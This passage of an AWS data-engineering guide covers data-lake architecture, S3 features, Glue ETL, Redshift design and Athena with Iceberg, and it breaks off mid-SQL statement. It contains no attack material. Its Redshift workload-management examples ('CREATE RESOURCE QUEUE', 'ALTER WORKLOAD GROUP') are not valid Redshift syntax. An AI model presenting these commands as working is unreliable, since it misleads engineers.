# AWS Data Services — Architecture, Implementation, and Security

## Table of Contents

1. [AWS Data Architecture Overview](#1-aws-data-architecture-overview)
2. [Amazon S3 Deep Dive](#2-amazon-s3-deep-dive)
3. [AWS Glue and ETL](#3-aws-glue-and-etl)
4. [Amazon Redshift](#4-amazon-redshift)
5. [Amazon Athena and Lake Formation](#5-amazon-athena-and-lake-formation)
6. [Streaming Services](#6-streaming-services)
7. [Security Architecture](#7-security-architecture)
8. [Security Assessment](#8-security-assessment)
9. [Monitoring and Compliance](#9-monitoring-and-compliance)
10. [Lab Exercises](#10-lab-exercises)

---

## 1. AWS Data Architecture Overview

### The Modern AWS Data Stack

AWS provides a layered data architecture that separates ingestion, storage, processing, and consumption. The canonical pattern follows:

```
Sources → Ingestion → Raw Storage → Processing → Curated Storage → Consumption
           (Kinesis,    (S3 Raw)      (Glue,        (S3 Curated)    (Athena,
            MSK,                       EMR,                          Redshift,
            DMS)                       Step Fn)                      QuickSight)
```

### Data Lake on S3

The data lake pattern uses S3 as the central storage layer with a medallion architecture:

- **Bronze (Raw):** Unprocessed data in original format (JSON, CSV, Avro, Parquet)
- **Silver (Cleaned):** Deduplicated, schema-validated, partitioned Parquet
- **Gold (Curated):** Business-level aggregates, optimized for query patterns

```hcl
# Terraform — Data Lake bucket structure
resource "aws_s3_bucket" "data_lake" {
  for_each = toset(["raw", "cleaned", "curated"])
  bucket   = "company-datalake-${each.key}-${data.aws_caller_identity.current.account_id}"
}

resource "aws_s3_bucket_lifecycle_configuration" "raw_lifecycle" {
  bucket = aws_s3_bucket.data_lake["raw"].id

  rule {
    id     = "transition-to-ia"
    status = "Enabled"
    transition {
      days          = 30
      storage_class = "STANDARD_IA"
    }
    transition {
      days          = 90
      storage_class = "GLACIER_INSTANT_RETRIEVAL"
    }
  }
}
```

### Data Warehouse — Redshift

Redshift serves structured, curated workloads where sub-second query latency against petabytes of data is required. It integrates with the lake via Redshift Spectrum for federated queries across S3 and cluster-local storage.

### Serverless Analytics — Athena + Glue

Athena provides schema-on-read analytics directly against S3. The Glue Data Catalog acts as the persistent metastore (Hive-compatible). No infrastructure provisioning required — pay per query scanned.

### Streaming Layer — Kinesis + MSK

Real-time ingestion uses Kinesis Data Streams for sub-second latency or MSK (Managed Streaming for Apache Kafka) for Kafka-native workloads. Kinesis Data Firehose delivers directly to S3, Redshift, or OpenSearch without custom consumers.

### ETL Orchestration — Glue + Step Functions

Glue handles serverless Spark-based ETL. Step Functions orchestrate multi-step workflows with branching, retries, error handling, and human approval gates. Together they form the processing backbone.

### Machine Learning — SageMaker

SageMaker connects to the data lake for feature engineering, training, and inference. Feature Store provides offline (S3-backed) and online (low-latency) feature access. Data Wrangler integrates with Glue for visual data preparation.

### Reference Architectures

**Batch Analytics Pattern:**
```
S3 Raw → Glue Crawler → Glue ETL → S3 Curated → Athena/Redshift → QuickSight
```

**Real-Time Pattern:**
```
Producers → Kinesis Data Streams → Lambda (transform) → Kinesis Firehose → S3
                                 → Kinesis Data Analytics (Flink) → DynamoDB
```

**ML Feature Pipeline:**
```
S3 Raw → Glue ETL → Feature Store (offline) → SageMaker Training
                   → Feature Store (online) → SageMaker Endpoint
```

**Change Data Capture (CDC):**
```
RDS/Aurora → DMS (CDC mode) → Kinesis Data Streams → Lambda → S3 (Iceberg)
```

**Data Mesh Pattern (domain-oriented ownership):**
```
Domain A (Marketing):
  S3://marketing-domain/ → Glue Catalog (marketing_db) → Lake Formation (domain admin)
                         → Published as Data Product via Data Sharing

Domain B (Finance):
  S3://finance-domain/ → Glue Catalog (finance_db) → Lake Formation (domain admin)
                       → Published as Data Product via Data Sharing

Central Governance:
  Lake Formation Tags → Cross-domain discovery via Catalog → Unified security policies
```

### Cost Optimization Strategies

Cost management across the data stack requires understanding pricing models per service:

| Service | Pricing Model | Optimization Lever |
|---------|--------------|-------------------|
| S3 | Per GB stored + requests | Lifecycle policies, Intelligent-Tiering |
| Athena | Per TB scanned | Partitioning, columnar formats, CTAS |
| Redshift | Per-node-hour (provisioned) or RPU-hour (serverless) | Reserved instances, pause/resume |
| Glue ETL | Per DPU-hour | Right-size DPU count, push-down predicates |
| Kinesis | Per shard-hour + per PUT | On-demand mode for variable workloads |
| MSK | Per broker-hour + storage | Tiered storage, right-size instances |

**Athena cost reduction example — partition pruning reduces scan by 99%:**
```sql
-- BAD: scans entire dataset (2 TB → $10 per query)
SELECT * FROM events WHERE event_date = '2024-06-15';

-- GOOD: partition pruning (scans ~5 GB → $0.025 per query)
SELECT * FROM events WHERE year = '2024' AND month = '06' AND day = '15';
```

### Step Functions for ETL Orchestration

Step Functions provide visual workflow orchestration with error handling, parallel branches, and human approval:

```json
{
  "Comment": "ETL Pipeline Orchestration",
  "StartAt": "CrawlNewData",
  "States": {
    "CrawlNewData": {
      "Type": "Task",
      "Resource": "arn:aws:states:::glue:startCrawler.sync",
      "Parameters": { "Name": "raw-events-crawler" },
      "Next": "TransformData",
      "Retry": [{ "ErrorEquals": ["Glue.CrawlerRunningException"], "IntervalSeconds": 60, "MaxAttempts": 3 }]
    },
    "TransformData": {
      "Type": "Task",
      "Resource": "arn:aws:states:::glue:startJobRun.sync",
      "Parameters": {
        "JobName": "events-etl",
        "Arguments": {
          "--SOURCE_DATABASE": "raw_db",
          "--SOURCE_TABLE": "events",
          "--TARGET_PATH": "s3://company-datalake-curated/events/"
        }
      },
      "Next": "QualityCheck",
      "Catch": [{ "ErrorEquals": ["States.ALL"], "Next": "NotifyFailure" }]
    },
    "QualityCheck": {
      "Type": "Task",
      "Resource": "arn:aws:states:::athena:startQueryExecution.sync",
      "Parameters": {
        "QueryString": "SELECT COUNT(*) as cnt FROM curated_db.events WHERE year = '2024'",
        "WorkGroup": "etl-validation"
      },
      "Next": "ValidateCount"
    },
    "ValidateCount": {
      "Type": "Choice",
      "Choices": [{
        "Variable": "$.ResultSet.Rows[1].Data[0].VarCharValue",
        "NumericGreaterThan": 0,
        "Next": "Success"
      }],
      "Default": "NotifyFailure"
    },
    "Success": { "Type": "Succeed" },
    "NotifyFailure": {
      "Type": "Task",
      "Resource": "arn:aws:states:::sns:publish",
      "Parameters": {
        "TopicArn": "arn:aws:sns:us-east-1:123456789012:etl-alerts",
        "Message.$": "States.Format('ETL pipeline failed at {}', $$.State.Name)"
      },
      "End": true
    }
  }
}
```

---

## 2. Amazon S3 Deep Dive

### Storage Classes

| Class | Use Case | Retrieval | Min Duration |
|-------|----------|-----------|--------------|
| STANDARD | Frequent access | Immediate | None |
| INTELLIGENT_TIERING | Unknown patterns | Immediate | 30 days |
| STANDARD_IA | Infrequent, rapid access | Immediate | 30 days |
| ONE_ZONE_IA | Non-critical infrequent | Immediate | 30 days |
| GLACIER_INSTANT_RETRIEVAL | Archive, millisecond access | Immediate | 90 days |
| GLACIER_FLEXIBLE_RETRIEVAL | Archive, minutes-hours | 1-12 hours | 90 days |
| GLACIER_DEEP_ARCHIVE | Long-term compliance | 12-48 hours | 180 days |

### Lifecycle Policies

```json
{
  "Rules": [
    {
      "ID": "DataLakeLifecycle",
      "Status": "Enabled",
      "Filter": { "Prefix": "raw/" },
      "Transitions": [
        { "Days": 30, "StorageClass": "STANDARD_IA" },
        { "Days": 90, "StorageClass": "GLACIER_INSTANT_RETRIEVAL" },
        { "Days": 365, "StorageClass": "GLACIER_DEEP_ARCHIVE" }
      ],
      "NoncurrentVersionTransitions": [
        { "NoncurrentDays": 7, "StorageClass": "GLACIER_FLEXIBLE_RETRIEVAL" }
      ],
      "NoncurrentVersionExpiration": { "NoncurrentDays": 90 }
    }
  ]
}
```

### Versioning and Replication

**Cross-Region Replication (CRR)** replicates objects to a bucket in a different region for DR or compliance. **Same-Region Replication (SRR)** copies within the same region for log aggregation or cross-account sharing.

```hcl
resource "aws_s3_bucket_replication_configuration" "crr" {
  bucket = aws_s3_bucket.source.id
  role   = aws_iam_role.replication.arn

  rule {
    id     = "replicate-curated"
    status = "Enabled"

    filter {
      prefix = "curated/"
    }

    destination {
      bucket        = aws_s3_bucket.dr_target.arn
      storage_class = "STANDARD_IA"

      encryption_configuration {
        replica_kms_key_id = aws_kms_key.dr_key.arn
      }
    }

    source_selection_criteria {
      sse_kms_encrypted_objects {
        status = "Enabled"
      }
    }

    delete_marker_replication {
      status = "Enabled"
    }
  }
}
```

### Event Notifications

S3 can trigger Lambda, SQS, SNS, or EventBridge on object creation, deletion, restore, or replication events:

```python
import boto3

s3 = boto3.client('s3')
s3.put_bucket_notification_configuration(
    Bucket='company-datalake-raw',
    NotificationConfiguration={
        'LambdaFunctionConfigurations': [
            {
                'LambdaFunctionArn': 'arn:aws:lambda:us-east-1:123456789012:function:process-upload',
                'Events': ['s3:ObjectCreated:*'],
                'Filter': {
                    'Key': {
                        'FilterRules': [
                            {'Name': 'prefix', 'Value': 'incoming/'},
                            {'Name': 'suffix', 'Value': '.parquet'}
                        ]
                    }
                }
            }
        ]
    }
)
```

### S3 Select and Glacier Select

Query subsets of objects without downloading the entire object. Supports CSV, JSON, and Parquet:

```python
import boto3

s3 = boto3.client('s3')
response = s3.select_object_content(
    Bucket='analytics-data',
    Key='events/2024/01/events.parquet',
    ExpressionType='SQL',
    Expression="SELECT s.user_id, s.event_type FROM s3object s WHERE s.event_type = 'purchase'",
    InputSerialization={'Parquet': {}},
    OutputSerialization={'JSON': {}}
)

for event in response['Payload']:
    if 'Records' in event:
        print(event['Records']['Payload'].decode('utf-8'))
```

### S3 Access Points

Named network endpoints with dedicated access policies. Simplify managing access for shared datasets:

```hcl
resource "aws_s3_access_point" "analytics_team" {
  bucket = aws_s3_bucket.data_lake["curated"].id
  name   = "analytics-team-ap"

  vpc_configuration {
    vpc_id = aws_vpc.analytics.id
  }

  public_access_block_configuration {
    block_public_acls       = true
    block_public_policy     = true
    ignore_public_acls      = true
    restrict_public_buckets = true
  }
}

resource "aws_s3control_access_point_policy" "analytics_team" {
  access_point_arn = aws_s3_access_point.analytics_team.arn
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { AWS = aws_iam_role.analytics_team.arn }
      Action    = ["s3:GetObject", "s3:ListBucket"]
      Resource  = [
        "${aws_s3_access_point.analytics_team.arn}",
        "${aws_s3_access_point.analytics_team.arn}/object/curated/*"
      ]
    }]
  })
}
```

### Multi-Region Access Points (MRAP)

A global endpoint that routes S3 requests to the closest bucket replica using AWS Global Accelerator:

```bash
# Create MRAP via CLI
aws s3control create-multi-region-access-point \
  --account-id 123456789012 \
  --details '{
    "Name": "global-datalake",
    "Regions": [
      {"Bucket": "datalake-us-east-1"},
      {"Bucket": "datalake-eu-west-1"},
      {"Bucket": "datalake-ap-southeast-1"}
    ]
  }'
```

### Object Lambda

Transform objects on retrieval without storing multiple copies:

```python
# Lambda function for Object Lambda Access Point
import boto3
import json

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    
    # Get the original object
    url = event['getObjectContext']['inputS3Url']
    route = event['getObjectContext']['outputRoute']
    token = event['getObjectContext']['outputToken']
    
    import urllib.request
    response = urllib.request.urlopen(url)
    original = json.loads(response.read())
    
    # Redact PII fields
    for record in original:
        record.pop('ssn', None)
        record.pop('email', None)
        if 'phone' in record:
            record['phone'] = record['phone'][:3] + '****'
    
    # Write transformed object back
    s3.write_get_object_response(
        Body=json.dumps(original),
        RequestRoute=route,
        RequestToken=token
    )
    return {'statusCode': 200}
```

### S3 Inventory and Analytics

S3 Inventory provides scheduled reports of objects and their metadata — essential for auditing encryption status, storage class distribution, and replication health:

```hcl
resource "aws_s3_bucket_inventory" "full_inventory" {
  bucket = aws_s3_bucket.data_lake["curated"].id
  name   = "full-inventory"

  included_object_versions = "Current"

  schedule {
    frequency = "Daily"
  }

  destination {
    bucket {
      format     = "Parquet"
      bucket_arn = aws_s3_bucket.inventory_destination.arn
      prefix     = "inventory/"
      encryption {
        sse_kms {
          key_id = aws_kms_key.data_platform.arn
        }
      }
    }
  }

  optional_fields = [
    "Size",
    "LastModifiedDate",
    "StorageClass",
    "EncryptionStatus",
    "ReplicationStatus",
    "ObjectLockMode",
    "IntelligentTieringAccessTier",
    "ChecksumAlgorithm"
  ]
}
```

Query inventory with Athena to find unencrypted objects:
```sql
SELECT key, size, last_modified_date, encryption_status
FROM s3_inventory_table
WHERE encryption_status = 'NOT-SSE'
  OR encryption_status = 'SSE-S3'  -- SSE-S3 has no audit trail
ORDER BY size DESC
LIMIT 100;
```

### S3 Batch Operations

Execute bulk operations across billions of objects — useful for encryption migration, tagging, or copying:

```python
import boto3

s3control = boto3.client('s3control')

# Create batch operation to re-encrypt objects with new KMS key
response = s3control.create_job(
    AccountId='123456789012',
    ConfirmationRequired=True,
    Operation={
        'S3PutObjectCopy': {
            'TargetResource': 'arn:aws:s3:::company-datalake-curated',
            'MetadataDirective': 'COPY',
            'NewObjectMetadata': {},
            'StorageClass': 'STANDARD',
            'SSEAwsKmsKeyId': 'arn:aws:kms:us-east-1:123456789012:key/new-key-id'
        }
    },
    Report={
        'Bucket': 'arn:aws:s3:::batch-operation-reports',
        'Format': 'Report_CSV_20180820',
        'Enabled': True,
        'Prefix': 'encryption-migration/',
        'ReportScope': 'AllTasks'
    },
    Manifest={
        'Spec': {
            'Format': 'S3InventoryReport_CSV_20211130',
            'Fields': ['Bucket', 'Key', 'VersionId']
        },
        'Location': {
            'ObjectArn': 'arn:aws:s3:::inventory-destination/inventory/data.csv',
            'ETag': 'abc123'
        }
    },
    Priority=10,
    RoleArn='arn:aws:iam::123456789012:role/S3BatchOperationsRole'
)
```

### Transfer Acceleration

Uses CloudFront edge locations to accelerate uploads over long distances. Enable per-bucket, access via `<bucket>.s3-accelerate.amazonaws.com`:

```python
s3 = boto3.client('s3', config=boto3.session.Config(s3={'use_accelerate_endpoint': True}))
s3.upload_file('large_dataset.parquet', 'company-datalake-raw', 'incoming/dataset.parquet')
```

---

## 3. AWS Glue and ETL

### Glue Data Catalog

The Glue Data Catalog is a Hive metastore-compatible central metadata repository. It stores table definitions, partition information, and schema versions. Athena, Redshift Spectrum, EMR, and Spark all consume it.

```hcl
resource "aws_glue_catalog_database" "analytics" {
  name = "analytics_db"

  create_table_default_permission {
    permissions = ["ALL"]
    principal {
      data_lake_principal_identifier = "IAM_ALLOWED_PRINCIPALS"
    }
  }
}

resource "aws_glue_catalog_table" "events" {
  database_name = aws_glue_catalog_database.analytics.name
  name          = "user_events"

  table_type = "EXTERNAL_TABLE"

  parameters = {
    "classification"  = "parquet"
    "compressionType" = "snappy"
  }

  storage_descriptor {
    location      = "s3://company-datalake-curated/events/"
    input_format  = "org.apache.hadoop.hive.ql.io.parquet.MapredParquetInputFormat"
    output_format = "org.apache.hadoop.hive.ql.io.parquet.MapredParquetOutputFormat"

    ser_de_info {
      serialization_library = "org.apache.hadoop.hive.ql.io.parquet.serde.ParquetHiveSerDe"
    }

    columns {
      name = "user_id"
      type = "string"
    }
    columns {
      name = "event_type"
      type = "string"
    }
    columns {
      name = "event_timestamp"
      type = "timestamp"
    }
    columns {
      name = "properties"
      type = "map<string,string>"
    }
  }

  partition_keys {
    name = "year"
    type = "string"
  }
  partition_keys {
    name = "month"
    type = "string"
  }
  partition_keys {
    name = "day"
    type = "string"
  }
}
```

### Glue Crawlers

Crawlers scan data sources, infer schemas, and populate the Data Catalog automatically:

```hcl
resource "aws_glue_crawler" "raw_crawler" {
  database_name = aws_glue_catalog_database.analytics.name
  name          = "raw-events-crawler"
  role          = aws_iam_role.glue_role.arn

  s3_target {
    path = "s3://company-datalake-raw/events/"
  }

  schema_change_policy {
    update_behavior = "UPDATE_IN_DATABASE"
    delete_behavior = "LOG"
  }

  recrawl_policy {
    recrawl_behavior = "CRAWL_NEW_FOLDERS_ONLY"
  }

  configuration = jsonencode({
    Version = 1.0
    Grouping = {
      TableGroupingPolicy = "CombineCompatibleSchemas"
    }
    CrawlerOutput = {
      Partitions = { AddOrUpdateBehavior = "InheritFromTable" }
    }
  })

  schedule = "cron(0 */6 * * ? *)"
}
```

### Glue ETL Jobs (PySpark)

```python
# Glue ETL Job — PySpark
import sys
from awsglue.transforms import *
from awsglue.utils import getResolvedOptions
from awsglue.context import GlueContext
from awsglue.job import Job
from awsglue.dynamicframe import DynamicFrame
from pyspark.context import SparkContext
from pyspark.sql.functions import col, from_json, to_timestamp, year, month, dayofmonth

args = getResolvedOptions(sys.argv, ['JOB_NAME', 'SOURCE_DATABASE', 'SOURCE_TABLE', 'TARGET_PATH'])

sc = SparkContext()
glueContext = GlueContext(sc)
spark = glueContext.spark_session
job = Job(glueContext)
job.init(args['JOB_NAME'], args)

# Read from catalog
source_dyf = glueContext.create_dynamic_frame.from_catalog(
    database=args['SOURCE_DATABASE'],
    table_name=args['SOURCE_TABLE'],
    transformation_ctx="source_dyf",
    additional_options={"useS3ListImplementation": True}
)

# Convert to DataFrame for complex transforms
df = source_dyf.toDF()

# Data quality: drop nulls, deduplicate
df_clean = (
    df
    .dropna(subset=['user_id', 'event_type'])
    .dropDuplicates(['user_id', 'event_timestamp', 'event_type'])
    .withColumn('event_ts', to_timestamp(col('event_timestamp')))
    .withColumn('year', year(col('event_ts')))
    .withColumn('month', month(col('event_ts')))
    .withColumn('day', dayofmonth(col('event_ts')))
)

# Write partitioned Parquet
df_clean.write.mode('append') \
    .partitionBy('year', 'month', 'day') \
    .parquet(args['TARGET_PATH'])

job.commit()
```

### Glue DataBrew

Visual data preparation service with 250+ built-in transformations. Define recipes (reusable transformation sequences) without code:

```bash
# Create a DataBrew dataset
aws databrew create-dataset \
  --name raw-events-dataset \
  --input '{
    "S3InputDefinition": {
      "Bucket": "company-datalake-raw",
      "Key": "events/"
    }
  }' \
  --format-options '{
    "Json": { "MultiLine": true }
  }'
```

### Glue Schema Registry

Centralized schema governance for streaming and batch data. Supports Avro, JSON Schema, and Protobuf:

```python
import boto3

glue = boto3.client('glue')

# Create registry
glue.create_registry(
    RegistryName='event-schemas',
    Description='Event schema registry for streaming data'
)

# Register schema
glue.create_schema(
    RegistryId={'RegistryName': 'event-schemas'},
    SchemaName='user-event',
    DataFormat='AVRO',
    Compatibility='BACKWARD',
    SchemaDefinition=json.dumps({
        "type": "record",
        "name": "UserEvent",
        "namespace": "com.company.events",
        "fields": [
            {"name": "user_id", "type": "string"},
            {"name": "event_type", "type": "string"},
            {"name": "timestamp", "type": "long", "logicalType": "timestamp-millis"},
            {"name": "properties", "type": {"type": "map", "values": "string"}}
        ]
    })
)
```

### Job Bookmarks

Job bookmarks track previously processed data to prevent reprocessing. Glue persists a checkpoint after each successful run:

```python
# Enable in job arguments
args = getResolvedOptions(sys.argv, ['JOB_NAME'])
job.init(args['JOB_NAME'], args)

# Read with bookmark tracking
dyf = glueContext.create_dynamic_frame.from_catalog(
    database="analytics_db",
    table_name="raw_events",
    transformation_ctx="bookmark_ctx"  # THIS enables bookmarks
)

# ... transforms ...

job.commit()  # Checkpoint saved here
```

### Partition Handling

Efficient partition pruning requires push-down predicates:

```python
# Push-down predicate for partition pruning
dyf = glueContext.create_dynamic_frame.from_catalog(
    database="analytics_db",
    table_name="user_events",
    push_down_predicate="year='2024' AND month='06'",
    transformation_ctx="partitioned_read"
)
```

### Glue Connections and VPC

Glue jobs needing access to RDS, Redshift, or on-premises resources require a VPC connection:

```hcl
resource "aws_glue_connection" "redshift" {
  name            = "redshift-connection"
  connection_type = "JDBC"

  connection_properties = {
    JDBC_CONNECTION_URL = "jdbc:redshift://${aws_redshift_cluster.main.endpoint}/analytics"
    USERNAME            = "glue_etl_user"
    PASSWORD            = aws_secretsmanager_secret_version.redshift_pass.secret_string
  }

  physical_connection_requirements {
    availability_zone      = "us-east-1a"
    security_group_id_list = [aws_security_group.glue_sg.id]
    subnet_id              = aws_subnet.private_a.id
  }
}
```

---

## 4. Amazon Redshift

### Architecture

Redshift uses a massively parallel processing (MPP) architecture:

- **Leader Node:** Receives queries, develops execution plans, coordinates compute nodes
- **Compute Nodes:** Store data in columnar format, execute query fragments in parallel
- **Slices:** Each compute node is divided into slices (virtual CPUs), each processing a portion of the data

Node types:
- **RA3 (recommended):** Managed storage on S3, compute decoupled from storage
- **DC2:** Dense compute with local SSD (legacy, for sub-TB workloads)

### Distribution Styles

Distribution determines how rows are assigned to slices:

| Style | Behavior | Best For |
|-------|----------|----------|
| KEY | Rows with same key value → same slice | Large fact tables joined on a specific column |
| EVEN | Round-robin across all slices | Tables without clear join key |
| ALL | Full copy on every node | Small dimension tables (<= 5M rows) |
| AUTO | Redshift chooses (starts ALL, migrates to EVEN/KEY) | Default for most tables |

```sql
-- Fact table with KEY distribution on the join column
CREATE TABLE sales_fact (
    sale_id         BIGINT IDENTITY(1,1),
    customer_id     BIGINT NOT NULL,
    product_id      INTEGER NOT NULL,
    sale_date       DATE NOT NULL ENCODE delta,
    quantity        INTEGER ENCODE az64,
    amount          DECIMAL(12,2) ENCODE az64,
    region          VARCHAR(50) ENCODE zstd
)
DISTSTYLE KEY
DISTKEY (customer_id)
SORTKEY (sale_date);

-- Dimension table distributed to all nodes
CREATE TABLE product_dim (
    product_id      INTEGER NOT NULL,
    product_name    VARCHAR(200),
    category        VARCHAR(100),
    subcategory     VARCHAR(100)
)
DISTSTYLE ALL
SORTKEY (product_id);
```

### Sort Keys

Sort keys determine the physical order of rows on disk:

- **Compound sort key:** Multi-column prefix ordering. Efficient for queries filtering on leading columns.
- **Interleaved sort key:** Equal weight to each column. Better for ad-hoc queries on any column combination. Higher VACUUM cost.

```sql
-- Compound (best for time-series queries filtering on date first)
CREATE TABLE events (
    event_id BIGINT,
    event_date DATE,
    event_type VARCHAR(50),
    user_id BIGINT
)
COMPOUND SORTKEY (event_date, event_type);

-- Interleaved (best for ad-hoc filters on any column)
CREATE TABLE search_logs (
    query_text VARCHAR(500),
    user_id BIGINT,
    search_date DATE,
    result_count INTEGER
)
INTERLEAVED SORTKEY (user_id, search_date, result_count);
```

### Workload Management (WLM)

WLM controls query queuing, memory allocation, and concurrency:

```sql
-- Create query queues with priorities
CREATE RESOURCE QUEUE etl_queue
  WITH (CONCURRENCY_LEVEL = 5, MEMORY_PERCENT = 40, TIMEOUT = 3600);

CREATE RESOURCE QUEUE interactive_queue
  WITH (CONCURRENCY_LEVEL = 20, MEMORY_PERCENT = 50, TIMEOUT = 60);

CREATE RESOURCE QUEUE admin_queue
  WITH (CONCURRENCY_LEVEL = 3, MEMORY_PERCENT = 10, TIMEOUT = 0);

-- Assign users to queues via parameter groups
-- In the cluster parameter group:
-- wlm_json_configuration = [
--   {"query_group": ["etl"], "memory_percent_to_use": 40, "concurrency": 5},
--   {"query_group": ["interactive"], "memory_percent_to_use": 50, "concurrency": 20},
--   {"query_group": ["admin"], "memory_percent_to_use": 10, "concurrency": 3}
-- ]
```

### Redshift Spectrum

Query S3 data using Redshift SQL without loading it into the cluster:

```sql
-- Create external schema pointing to Glue Catalog
CREATE EXTERNAL SCHEMA lake_schema
FROM DATA CATALOG
DATABASE 'analytics_db'
IAM_ROLE 'arn:aws:iam::123456789012:role/RedshiftSpectrumRole'
CREATE EXTERNAL DATABASE IF NOT EXISTS;

-- Query S3 data alongside local tables
SELECT
    f.customer_id,
    c.customer_name,
    SUM(f.amount) as total_spend
FROM lake_schema.user_events f
JOIN public.customer_dim c ON f.customer_id = c.customer_id
WHERE f.year = '2024' AND f.month = '06'
GROUP BY 1, 2
ORDER BY total_spend DESC
LIMIT 100;
```

### Materialized Views

```sql
CREATE MATERIALIZED VIEW mv_daily_sales AS
SELECT
    sale_date,
    region,
    COUNT(*) as transaction_count,
    SUM(amount) as total_revenue,
    AVG(amount) as avg_order_value
FROM sales_fact
GROUP BY sale_date, region;

-- Auto-refresh
ALTER MATERIALIZED VIEW mv_daily_sales AUTO REFRESH YES;
```

### Query Performance Tuning

**Diagnose slow queries:**
```sql
-- Find queries with high disk I/O (missing sort key usage)
SELECT
    query,
    substring(querytxt, 1, 80) AS query_text,
    elapsed / 1000000.0 AS seconds,
    rows_pre_filter,
    rows_pre_user_filter,
    (rows_pre_filter - rows_pre_user_filter)::float / NULLIF(rows_pre_filter, 0) * 100 AS pct_filtered
FROM stl_scan s
JOIN stl_query q ON s.query = q.query
WHERE s.starttime > GETDATE() - INTERVAL '1 hour'
  AND elapsed > 5000000  -- > 5 seconds
ORDER BY elapsed DESC
LIMIT 20;

-- Identify distribution skew (uneven slice workload)
SELECT
    query,
    slice,
    elapsed,
    rows
FROM svl_query_report
WHERE query = 12345
ORDER BY elapsed DESC;

-- Check table design advisors
SELECT * FROM svv_alter_table_recommendations
WHERE type = 'distribution'
ORDER BY benefit DESC;
```

**Encoding (compression) optimization:**
```sql
-- ANALYZE COMPRESSION recommends optimal encodings
ANALYZE COMPRESSION sales_fact;

-- Common recommendations:
-- BIGINT columns → AZ64 (Amazon proprietary, best for numeric)
-- DATE/TIMESTAMP → DELTA (sequential dates compress well)
-- VARCHAR with repetition → ZSTD or LZO
-- BOOLEAN → RAW (already 1 byte)
```

**Concurrency scaling:**

Redshift automatically adds transient clusters during peak demand. Configure per-queue:
```sql
-- Enable concurrency scaling for the interactive queue
ALTER WORKLOAD GROUP interactive SET CONCURRENCY_SCALING = 'auto';

-- Monitor concurrency scaling usage
SELECT
    service_class,
    num_queued_queries,
    num_executing_queries,
    SUM(total_exec_time) / 1000000.0 AS total_exec_seconds
FROM stl_wlm_query
WHERE starttime > GETDATE() - INTERVAL '1 day'
GROUP BY 1, 2, 3;
```

### AQUA (Advanced Query Accelerator)

Hardware-accelerated cache layer on RA3 nodes. Pushes scan-intensive operations (LIKE, regex, aggregation) to the storage layer. Enabled by default on RA3 — no user action required.

### Redshift Serverless

No cluster management. Pay for compute in RPUs (Redshift Processing Units):

```hcl
resource "aws_redshiftserverless_namespace" "analytics" {
  namespace_name      = "analytics-ns"
  db_name             = "analytics"
  admin_username      = "admin"
  admin_user_password = var.redshift_admin_password
  kms_key_id          = aws_kms_key.redshift.arn

  iam_roles = [aws_iam_role.redshift_spectrum.arn]
}

resource "aws_redshiftserverless_workgroup" "analytics" {
  namespace_name = aws_redshiftserverless_namespace.analytics.namespace_name
  workgroup_name = "analytics-wg"
  base_capacity  = 32  # RPUs (8-512)

  config_parameter {
    parameter_key   = "max_query_execution_time"
    parameter_value = "300"
  }

  security_group_ids = [aws_security_group.redshift.id]
  subnet_ids         = aws_subnet.private[*].id
}
```

### Data Sharing

Cross-cluster and cross-account data sharing without copying:

```sql
-- Producer cluster
CREATE DATASHARE analytics_share SET PUBLICACCESSIBLE FALSE;
ALTER DATASHARE analytics_share ADD SCHEMA public;
ALTER DATASHARE analytics_share ADD TABLE public.sales_fact;
ALTER DATASHARE analytics_share ADD TABLE public.customer_dim;

-- Grant to consumer account
GRANT USAGE ON DATASHARE analytics_share TO ACCOUNT '987654321098';

-- Consumer cluster
CREATE DATABASE shared_analytics FROM DATASHARE analytics_share
OF ACCOUNT '123456789012' NAMESPACE 'abc123-def456';
```

---

## 5. Amazon Athena and Lake Formation

### Athena Engine

Athena v3 is based on the Trino (formerly Presto) distributed SQL engine. It supports:
- Standard SQL (ANSI)
- Complex types (arrays, maps, structs)
- Window functions
- Geospatial queries
- Federated queries (via connectors to DynamoDB, RDS, Redshift, etc.)
- Apache Iceberg, Hudi, Delta Lake table formats

### Partitioning for Performance

Partition projection eliminates the need for `MSCK REPAIR TABLE` by computing partitions at query time:

```sql
CREATE EXTERNAL TABLE user_events (
    user_id STRING,
    event_type STRING,
    event_timestamp TIMESTAMP,
    properties MAP<STRING, STRING>
)
PARTITIONED BY (year STRING, month STRING, day STRING)
ROW FORMAT SERDE 'org.apache.hadoop.hive.ql.io.parquet.serde.ParquetHiveSerDe'
STORED AS PARQUET
LOCATION 's3://company-datalake-curated/events/'
TBLPROPERTIES (
    'projection.enabled' = 'true',
    'projection.year.type' = 'integer',
    'projection.year.range' = '2020,2030',
    'projection.month.type' = 'integer',
    'projection.month.range' = '1,12',
    'projection.month.digits' = '2',
    'projection.day.type' = 'integer',
    'projection.day.range' = '1,31',
    'projection.day.digits' = '2',
    'storage.location.template' = 's3://company-datalake-curated/events/year=${year}/month=${month}/day=${day}/'
);
```

### CTAS and INSERT INTO

Create Table As Select (CTAS) materializes query results into optimized formats:

```sql
-- CTAS: create optimized table from raw data
CREATE TABLE curated_db.daily_aggregates
WITH (
    format = 'PARQUET',
    parquet_compression = 'SNAPPY',
    partitioned_by = ARRAY['region'],
    external_location = 's3://company-datalake-curated/daily_aggregates/',
    bucketed_by = ARRAY['customer_id'],
    bucket_count = 16
) AS
SELECT
    customer_id,
    event_date,
    COUNT(*) as event_count,
    SUM(revenue) as total_revenue,
    region
FROM raw_db.events
WHERE year = '2024'
GROUP BY customer_id, event_date, region;

-- INSERT INTO: append new data incrementally
INSERT INTO curated_db.daily_aggregates
SELECT customer_id, event_date, COUNT(*), SUM(revenue), region
FROM raw_db.events
WHERE year = '2024' AND month = '07'
GROUP BY customer_id, event_date, region;
```

### Athena ACID (Iceberg)

Apache Iceberg support enables ACID transactions, time travel, and schema evolution:

```sql
-- Create Iceberg table
CREATE TABLE iceberg_db.user_events (
    user_id STRING,
    event_type STRING,
    event_timestamp TIMESTAMP,
    amount DECIMAL(12,2)
)
PARTITIONED BY (month(event_timestamp))
LOCATION 's3://company-datalake-curated/iceberg/user_events/'
TBLPROPERTIES (
    'table_type' = 'ICEBERG',
    'format' = 'parquet',
    'write_compression' = 'snappy'
);

-- MERGE (upsert)
MERGE INTO iceberg_db.user_events t
USING staging_db.new_events s
ON t.user_id = s.user_id AND t.event_timestamp = s.event_timestamp
WHEN MATCHED THEN UPDATE SET amount = s.amount
WHEN NOT MATCHED THEN INSERT (user_id, event_type, event_timestamp, amount)
